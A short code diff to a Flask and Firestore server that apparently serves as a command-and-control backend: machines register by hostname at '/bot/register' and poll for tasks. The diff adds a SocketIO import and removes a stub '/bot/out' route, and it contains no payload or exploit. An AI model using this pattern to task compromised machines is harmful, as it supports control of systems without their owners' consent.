@@ -1,7 +1,11 @@
 from flask import Flask, request, Blueprint
+from flask_socketio import SocketIO
+
 import firebase_admin
 from firebase_admin import credentials, firestore
+
 import uuid
+
 from . import routes
 
 client_api = Blueprint('client_api', __name__)
@@ -10,7 +14,6 @@ client_api = Blueprint('client_api', __name__)
 cred = credentials.Certificate("serviceAccountKey.json")
 firebase_admin.initialize_app(cred)
 db = firestore.client()
-
 
 @routes.route('/bot/register/<string:hostname>', methods=['POST'])
 def index(hostname):
@@ -44,8 +47,3 @@ def poll():
         return {'task': task}
 
     return ({'task': None}, 418)
-
-
-@routes.route('/bot/out')
-def out():
-    return 'aaaa'
